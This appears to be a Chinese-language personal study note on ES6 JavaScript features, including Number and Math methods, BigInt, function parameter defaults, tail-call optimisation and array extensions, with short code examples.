<h2 id="Number-isFinite-Number-isNaN"><a href="#Number-isFinite-Number-isNaN" class="headerlink" title="Number.isFinite(), Number.isNaN()"></a>Number.isFinite(), Number.isNaN()</h2><p>ES6 在Number对象上，新提供了Number.isFinite()和Number.isNaN()两个方法。</p>
<p>Number.isFinite()用来检查一个数值是否为有限的（finite），即不是Infinity。</p>
<p>注意，如果参数类型不是数值，Number.isFinite一律返回false。</p>
<p>Number.isNaN()用来检查一个值是否为NaN。</p>
<p>它们与传统的全局方法isFinite()和isNaN()的区别在于，传统方法先调用Number()将非数值的值转为数值，再进行判断，而这两个新方法只对数值有效，Number.isFinite()对于非数值一律返回false, Number.isNaN()只有对于NaN才返回true，非NaN一律返回false。</p>
<h2 id="Number-parseInt-Number-parseFloat"><a href="#Number-parseInt-Number-parseFloat" class="headerlink" title="Number.parseInt(), Number.parseFloat()"></a>Number.parseInt(), Number.parseFloat()</h2><p>ES6 将全局方法parseInt()和parseFloat()，移植到Number对象上面，行为完全保持不变。</p>
<h2 id="Number-isInteger"><a href="#Number-isInteger" class="headerlink" title="Number.isInteger()"></a>Number.isInteger()</h2><p>Number.isInteger()用来判断一个数值是否为整数。</p>
<p>JavaScript 内部，整数和浮点数采用的是同样的储存方法，所以 25 和 25.0 被视为同一个值。</p>
<p>如果参数不是数值，Number.isInteger返回false。</p>
<h2 id="Number-EPSILON"><a href="#Number-EPSILON" class="headerlink" title="Number.EPSILON"></a>Number.EPSILON</h2><p>ES6 在Number对象上面，新增一个极小的常量Number.EPSILON。根据规格，它表示 1 与大于 1 的最小浮点数之间的差。</p>
<p>Number.EPSILON实际上是 JavaScript 能够表示的最小精度。误差如果小于这个值，就可以认为已经没有意义了，即不存在误差了。</p>
<h2 id="安全整数和-Number-isSafeInteger"><a href="#安全整数和-Number-isSafeInteger" class="headerlink" title="安全整数和 Number.isSafeInteger()"></a>安全整数和 Number.isSafeInteger()</h2><p>JavaScript 能够准确表示的整数范围在-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示这个值。</p>
<p>ES6 引入了Number.MAX_SAFE_INTEGER和Number.MIN_SAFE_INTEGER这两个常量，用来表示这个范围的上下限。</p>
<h2 id="Math-对象的扩展"><a href="#Math-对象的扩展" class="headerlink" title="Math 对象的扩展"></a>Math 对象的扩展</h2><p>ES6 在 Math 对象上新增了 17 个与数学相关的方法。所有这些方法都是静态方法，只能在 Math 对象上调用。</p>
<h2 id="Math-trunc"><a href="#Math-trunc" class="headerlink" title="Math.trunc()"></a>Math.trunc()</h2><p>Math.trunc方法用于去除一个数的小数部分，返回整数部分。</p>
<h2 id="Math-sign"><a href="#Math-sign" class="headerlink" title="Math.sign()"></a>Math.sign()</h2><p>Math.sign方法用来判断一个数到底是正数、负数、还是零。对于非数值，会先将其转换为数值。</p>
<h2 id="Math-cbrt"><a href="#Math-cbrt" class="headerlink" title="Math.cbrt()"></a>Math.cbrt()</h2><h2 id="Math-clz32"><a href="#Math-clz32" class="headerlink" title="Math.clz32()"></a>Math.clz32()</h2><p>Math.clz32()方法将参数转为 32 位无符号整数的形式，然后返回这个 32 位值里面有多少个前导 0。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1</span>) <span class="comment">// 31</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1000</span>) <span class="comment">// 22</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0b01000000000000000000000000000000</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0b00100000000000000000000000000000</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="Math-imul"><a href="#Math-imul" class="headerlink" title="Math.imul()"></a>Math.imul()</h2><p>Math.imul方法返回两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数。</p>
<p>这就是说，对于那些很大的数的乘法，低位数值往往都是不精确的，Math.imul方法可以返回正确的低位数值。</p>
<h2 id="Math-fround"><a href="#Math-fround" class="headerlink" title="Math.fround()"></a>Math.fround()</h2><p>Math.fround方法返回一个数的32位单精度浮点数形式。</p>
<p>Math.fround方法的主要作用，是将64位双精度浮点数转为32位单精度浮点数。如果小数的精度超过24个二进制位，返回值就会不同于原值，否则返回值不变（即与64位双精度值一致）。</p>
<h2 id="Math-hypot"><a href="#Math-hypot" class="headerlink" title="Math.hypot()"></a>Math.hypot()</h2><p>Math.hypot方法返回所有参数的平方和的平方根。</p>
<h2 id="对数方法"><a href="#对数方法" class="headerlink" title="对数方法"></a>对数方法</h2><p>ES6 新增了 4 个对数相关方法。</p>
<h2 id="Math-expm1"><a href="#Math-expm1" class="headerlink" title="Math.expm1()"></a>Math.expm1()</h2><p>Math.expm1(x)返回 ex - 1，即Math.exp(x) - 1。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.expm1(<span class="number">-1</span>) <span class="comment">// -0.6321205588285577</span></span><br><span class="line"><span class="built_in">Math</span>.expm1(<span class="number">0</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.expm1(<span class="number">1</span>)  <span class="comment">// 1.718281828459045</span></span><br></pre></td></tr></table></figure>
<h2 id="Math-log1p"><a href="#Math-log1p" class="headerlink" title="Math.log1p()"></a>Math.log1p()</h2><p>Math.log1p(x)方法返回1 + x的自然对数，即Math.log(1 + x)。如果x小于-1，返回NaN。</p>
<h2 id="Math-log10"><a href="#Math-log10" class="headerlink" title="Math.log10()"></a>Math.log10()</h2><p>Math.log10(x)返回以 10 为底的x的对数。如果x小于 0，则返回 NaN。</p>
<h2 id="Math-log2"><a href="#Math-log2" class="headerlink" title="Math.log2()"></a>Math.log2()</h2><p>Math.log2(x)返回以 2 为底的x的对数。如果x小于 0，则返回 NaN。</p>
<h2 id="双曲函数方法"><a href="#双曲函数方法" class="headerlink" title="双曲函数方法"></a>双曲函数方法</h2><p>ES6 新增了 6 个双曲函数方法。</p>
<p>Math.sinh(x) 返回x的双曲正弦（hyperbolic sine）<br>Math.cosh(x) 返回x的双曲余弦（hyperbolic cosine）<br>Math.tanh(x) 返回x的双曲正切（hyperbolic tangent）<br>Math.asinh(x) 返回x的反双曲正弦（inverse hyperbolic sine）<br>Math.acosh(x) 返回x的反双曲余弦（inverse hyperbolic cosine）<br>Math.atanh(x) 返回x的反双曲正切（inverse hyperbolic tangent）</p>
<h2 id="指数运算符"><a href="#指数运算符" class="headerlink" title="指数运算符"></a>指数运算符</h2><p>ES2016 新增了一个指数运算符（**）。</p>
<p>这个运算符的一个特点是右结合，而不是常见的左结合。</p>
<h2 id="BigInt-数据类型"><a href="#BigInt-数据类型" class="headerlink" title="BigInt 数据类型"></a>BigInt 数据类型</h2><p>JavaScript 所有数字都保存成 64 位浮点数，这给数值的表示带来了两大限制。一是数值的精度只能到 53 个二进制位（相当于 16 个十进制位），大于这个范围的整数，JavaScript 是无法精确表示的，这使得 JavaScript 不适合进行科学和金融方面的精确计算。二是大于或等于2的1024次方的数值，JavaScript 无法表示，会返回Infinity。</p>
<p>ES2020 引入了一种新的数据类型 BigInt（大整数），来解决这个问题，这是 ECMAScript 的第八种数据类型。BigInt 只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。</p>
<p>为了与 Number 类型区别，BigInt 类型的数据必须添加后缀n。</p>
<h2 id="BigInt-对象"><a href="#BigInt-对象" class="headerlink" title="BigInt 对象"></a>BigInt 对象</h2><p>JavaScript 原生提供BigInt对象，可以用作构造函数生成 BigInt 类型的数值。转换规则基本与Number()一致，将其他类型的值转为 BigInt。</p>
<p>JavaScript 原生提供BigInt对象，可以用作构造函数生成 BigInt 类型的数值。转换规则基本与Number()一致，将其他类型的值转为 BigInt。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">BigInt(<span class="number">123</span>) <span class="comment">// 123n</span></span><br><span class="line">BigInt(<span class="string">'123'</span>) <span class="comment">// 123n</span></span><br><span class="line">BigInt(<span class="literal">false</span>) <span class="comment">// 0n</span></span><br><span class="line">BigInt(<span class="literal">true</span>) <span class="comment">// 1n</span></span><br></pre></td></tr></table></figure>
<p>BigInt()构造函数必须有参数，而且参数必须可以正常转为数值，下面的用法都会报错。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> BigInt() <span class="comment">// TypeError</span></span><br><span class="line">BigInt(<span class="literal">undefined</span>) <span class="comment">//TypeError</span></span><br><span class="line">BigInt(<span class="literal">null</span>) <span class="comment">// TypeError</span></span><br><span class="line">BigInt(<span class="string">'123n'</span>) <span class="comment">// SyntaxError</span></span><br><span class="line">BigInt(<span class="string">'abc'</span>) <span class="comment">// SyntaxError</span></span><br></pre></td></tr></table></figure></p>
<p>BigInt 对象继承了 Object 对象的两个实例方法。</p>
<p>BigInt.prototype.toString()<br>BigInt.prototype.valueOf()</p>
<p>它还继承了 Number 对象的一个实例方法。</p>
<p>BigInt.prototype.toLocaleString()</p>
<p>此外，还提供了三个静态方法。</p>
<ol>
<li>BigInt.asUintN(width, BigInt)： 给定的 BigInt 转为 0 到 2width - 1 之间对应的值。</li>
<li>BigInt.asIntN(width, BigInt)：给定的 BigInt 转为 -2width - 1 到 2width - 1 - 1 之间对应的值。</li>
<li>BigInt.parseInt(string[, radix])：近似于Number.parseInt()，将一个字符串转换成指定进制的 BigInt。</li>
</ol>
<p>对于二进制数组，BigInt 新增了两个类型BigUint64Array和BigInt64Array，这两种数据类型返回的都是64位 BigInt。DataView对象的实例方法DataView.prototype.getBigInt64()和DataView.prototype.getBigUint64()，返回的也是 BigInt。</p>
<h2 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h2><p>可以使用Boolean()、Number()和String()这三个方法，将 BigInt 可以转为布尔值、数值和字符串类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="number">0n</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="number">1n</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="number">1n</span>)  <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">String</span>(<span class="number">1n</span>)  <span class="comment">// "1"</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，注意最后一个例子，转为字符串时后缀n会消失。</p>
<p>另外，取反运算符（!）也可以将 BigInt 转为布尔值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="number">0n</span> <span class="comment">// true</span></span><br><span class="line">!<span class="number">1n</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><p>数学运算方面，BigInt 类型的+、-、*和**这四个二元运算符，与 Number 类型的行为一致。除法运算/会舍去小数部分，返回一个整数。</p>
<h1 id="函数的扩展"><a href="#函数的扩展" class="headerlink" title="函数的扩展"></a>函数的扩展</h1><h2 id="参数默认值的位置"><a href="#参数默认值的位置" class="headerlink" title="参数默认值的位置"></a>参数默认值的位置</h2><p>通常情况下，定义了默认值的参数，应该是函数的尾参数。因为这样比较容易看出来，到底省略了哪些参数。如果非尾部的参数设置默认值，实际上这个参数是没法省略的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x = <span class="number">1</span>, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// [1, undefined]</span></span><br><span class="line">f(<span class="number">2</span>) <span class="comment">// [2, undefined]</span></span><br><span class="line">f(, <span class="number">1</span>) <span class="comment">// 报错</span></span><br><span class="line">f(<span class="literal">undefined</span>, <span class="number">1</span>) <span class="comment">// [1, 1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y = <span class="number">5</span>, z</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y, z];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// [undefined, 5, undefined]</span></span><br><span class="line">f(<span class="number">1</span>) <span class="comment">// [1, 5, undefined]</span></span><br><span class="line">f(<span class="number">1</span>, ,<span class="number">2</span>) <span class="comment">// 报错</span></span><br><span class="line">f(<span class="number">1</span>, <span class="literal">undefined</span>, <span class="number">2</span>) <span class="comment">// [1, 5, 2]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，有默认值的参数都不是尾参数。这时，无法只省略该参数，而不省略它后面的参数，除非显式输入undefined。</p>
<h2 id="函数的-length-属性"><a href="#函数的-length-属性" class="headerlink" title="函数的 length 属性"></a>函数的 length 属性</h2><p>指定了默认值以后，函数的length属性，将返回没有指定默认值的参数个数。也就是说，指定了默认值后，length属性将失真。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">5</span></span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b, c = <span class="number">5</span></span>) </span>&#123;&#125;).length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>这是因为length属性的含义是，该函数预期传入的参数个数。某个参数指定默认值以后，预期传入的参数个数就不包括这个参数了。同理，后文的 rest 参数也不会计入length属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>如果设置了默认值的参数不是尾参数，那么length属性也不再计入后面的参数了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">0</span>, b, c</span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b = <span class="number">1</span>, c</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>从 ES5 开始，函数内部可以设定为严格模式。</p>
<p>ES2016 做了一点修改，规定只要函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错。</p>
<p>这样规定的原因是，函数内部的严格模式，同时适用于函数体和函数参数。但是，函数执行的时候，先执行函数参数，然后再执行函数体。这样就有一个不合理的地方，只有从函数体之中，才能知道参数是否应该以严格模式执行，但是参数却应该先于函数体执行。</p>
<h2 id="箭头函数使用注意点"><a href="#箭头函数使用注意点" class="headerlink" title="箭头函数使用注意点"></a>箭头函数使用注意点</h2><p>箭头函数有几个使用注意点。</p>
<p>（1）函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。</p>
<p>（2）不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。</p>
<p>（3）不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。</p>
<p>（4）不可以使用yield命令，因此箭头函数不能用作 Generator 函数。</p>
<h1 id="尾调用优化"><a href="#尾调用优化" class="headerlink" title="尾调用优化"></a>尾调用优化</h1><h2 id="什么是尾调用"><a href="#什么是尾调用" class="headerlink" title="什么是尾调用"></a>什么是尾调用</h2><p>尾调用（Tail Call）是函数式编程的一个重要概念，本身非常简单，一句话就能说清楚，就是指某个函数的最后一步是调用另一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="尾调用优化-1"><a href="#尾调用优化-1" class="headerlink" title="尾调用优化"></a>尾调用优化</h2><p>即只保留内层函数的调用帧。如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。这就是“尾调用优化”的意义。</p>
<h2 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h2><p>函数调用自身，称为递归。如果尾调用自身，就称为尾递归。</p>
<p>递归非常耗费内存，因为需要同时保存成千上百个调用帧，很容易发生“栈溢出”错误（stack overflow）。但对于尾递归来说，由于只存在一个调用帧，所以永远不会发生“栈溢出”错误。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure>
<p>上面代码是一个阶乘函数，计算n的阶乘，最多需要保存n个调用记录，复杂度 O(n) 。</p>
<p>如果改写成尾递归，只保留一个调用记录，复杂度 O(1) 。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>, <span class="number">1</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure>
<p>递归本质上是一种循环操作。纯粹的函数式编程语言没有循环操作命令，所有的循环都用递归实现，这就是为什么尾递归对这些语言极其重要。对于其他支持“尾调用优化”的语言（比如 Lua，ES6），只需要知道循环可以用递归代替，而一旦使用递归，就最好使用尾递归。</p>
<h2 id="尾递归优化的实现"><a href="#尾递归优化的实现" class="headerlink" title="尾递归优化的实现"></a>尾递归优化的实现</h2><p>尾递归优化只在严格模式下生效，那么正常模式下，或者那些不支持该功能的环境中，有没有办法也使用尾递归优化呢？回答是可以的，就是自己实现尾递归优化。</p>
<p>它的原理非常简单。尾递归之所以需要优化，原因是调用栈太多，造成溢出，那么只要减少调用栈，就不会溢出。怎么做可以减少调用栈呢？就是采用“循环”换掉“递归”。</p>
<p>下面是一个正常的递归函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum(x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure>
<p>蹦床函数（trampoline）可以将递归执行转为循环执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trampoline</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (f &amp;&amp; f <span class="keyword">instanceof</span> <span class="built_in">Function</span>) &#123;</span><br><span class="line">    f = f();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就是蹦床函数的一个实现，它接受一个函数f作为参数。只要f执行后返回一个函数，就继续执行。注意，这里是返回一个函数，然后执行该函数，而不是函数里面调用函数，这样就避免了递归执行，从而就消除了调用栈过大的问题。</p>
<p>然后，要做的就是将原来的递归函数，改写为每一步返回另一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum.bind(<span class="literal">null</span>, x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，sum函数的每次执行，都会返回自身的另一个版本。</p>
<p>现在，使用蹦床函数执行sum，就不会发生调用栈溢出。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">trampoline(sum(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"><span class="comment">// 100001</span></span><br></pre></td></tr></table></figure></p>
<p>蹦床函数并不是真正的尾递归优化，下面的实现才是。???</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tco</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> value;</span><br><span class="line">  <span class="keyword">var</span> active = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> accumulated = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">accumulator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    accumulated.push(<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span> (!active) &#123;</span><br><span class="line">      active = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">while</span> (accumulated.length) &#123;</span><br><span class="line">        value = f.apply(<span class="keyword">this</span>, accumulated.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      active = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum = tco(<span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum(x + <span class="number">1</span>, y - <span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">100000</span>)</span><br><span class="line"><span class="comment">// 100001</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，tco函数是尾递归优化的实现，它的奥妙就在于状态变量active。默认情况下，这个变量是不激活的。一旦进入尾递归优化的过程，这个变量就激活了。然后，每一轮递归sum返回的都是undefined，所以就避免了递归执行；而accumulated数组存放每一轮sum执行的参数，总是有值的，这就保证了accumulator函数内部的while循环总是会执行。这样就很巧妙地将“递归”改成了“循环”，而后一轮的参数会取代前一轮的参数，保证了调用栈只有一层。</p>
<h1 id="数组的扩展"><a href="#数组的扩展" class="headerlink" title="数组的扩展"></a>数组的扩展</h1><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>扩展运算符还可以将字符串转为真正的数组，能够正确识别四个字节的 Unicode 字符。</p>
<h2 id="实现了-Iterator-接口的对象"><a href="#实现了-Iterator-接口的对象" class="headerlink" title="实现了 Iterator 接口的对象"></a>实现了 Iterator 接口的对象</h2><p>任何定义了遍历器（Iterator）接口的对象（参阅 Iterator 一章），都可以用扩展运算符转为真正的数组。</p>
<h2 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from()"></a>Array.from()</h2><p>Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）。</p>
<p>所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转为数组，而此时扩展运算符就无法转换。</p>
<p>下面是一个类似数组的对象，Array.from将它转为真正的数组。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">    <span class="string">'0'</span>: <span class="string">'a'</span>,</span><br><span class="line">    <span class="string">'1'</span>: <span class="string">'b'</span>,</span><br><span class="line">    <span class="string">'2'</span>: <span class="string">'c'</span>,</span><br><span class="line">    length: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5的写法</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br></pre></td></tr></table></figure></p>
<p>常见的类似数组的对象是 DOM 操作返回的 NodeList 集合，以及函数内部的arguments对象。Array.from都可以将它们转为真正的数组。</p>
<p>Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</p>
<p>如果map函数里面用到了this关键字，还可以传入Array.from的第三个参数，用来绑定this。</p>
<p>Array.from()的另一个应用是，将字符串转为数组，然后返回字符串的长度。因为它能正确处理各种 Unicode 字符。</p>
<h2 id="Array-of"><a href="#Array-of" class="headerlink" title="Array.of()"></a>Array.of()</h2><p>Array.of方法用于将一组值，转换为数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。不存在由于参数不同而导致的重载。它的行为非常统一。</p>
<p>Array.of方法可以用下面的代码模拟实现。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ArrayOf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="数组实例的-find-和-findIndex"><a href="#数组实例的-find-和-findIndex" class="headerlink" title="数组实例的 find() 和 findIndex()"></a>数组实例的 find() 和 findIndex()</h2><p>这两个方法都可以发现NaN，弥补了数组的indexOf方法的不足。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>)</span><br><span class="line"><span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].findIndex(<span class="function"><span class="params">y</span> =&gt;</span> <span class="built_in">Object</span>.is(<span class="literal">NaN</span>, y))</span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，indexOf方法无法识别数组的NaN成员，但是findIndex方法可以借助Object.is方法做到。</p>
<h2 id="数组实例的-fill"><a href="#数组实例的-fill" class="headerlink" title="数组实例的 fill()"></a>数组实例的 fill()</h2><p>注意，如果填充的类型为对象，那么被赋值的是同一个内存地址的对象，而不是深拷贝对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill(&#123;<span class="attr">name</span>: <span class="string">"Mike"</span>&#125;);</span><br><span class="line">arr[<span class="number">0</span>].name = <span class="string">"Ben"</span>;</span><br><span class="line">arr</span><br><span class="line"><span class="comment">// [&#123;name: "Ben"&#125;, &#123;name: "Ben"&#125;, &#123;name: "Ben"&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill([]);</span><br><span class="line">arr[<span class="number">0</span>].push(<span class="number">5</span>);</span><br><span class="line">arr</span><br><span class="line"><span class="comment">// [[5], [5], [5]]</span></span><br></pre></td></tr></table></figure>
<h2 id="数组实例的-includes"><a href="#数组实例的-includes" class="headerlink" title="数组实例的 includes()"></a>数组实例的 includes()</h2><p>没有该方法之前，我们通常使用数组的indexOf方法，检查是否包含某个值。</p>
<p>indexOf方法有两个缺点，一是不够语义化，它的含义是找到参数值的第一个出现位置，所以要去比较是否不等于-1，表达起来不够直观。二是，它内部使用严格相等运算符（===）进行判断，这会导致对NaN的误判。</p>
<h2 id="数组的空位"><a href="#数组的空位" class="headerlink" title="数组的空位"></a>数组的空位</h2><p>ES5 对空位的处理，已经很不一致了，大多数情况下会忽略空位。</p>
<ol>
<li>forEach(), filter(), reduce(), every() 和some()都会跳过空位。</li>
<li>map()会跳过空位，但会保留这个值</li>
<li>join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串。</li>
</ol>
<p>ES6 则是明确将空位转为undefined。</p>
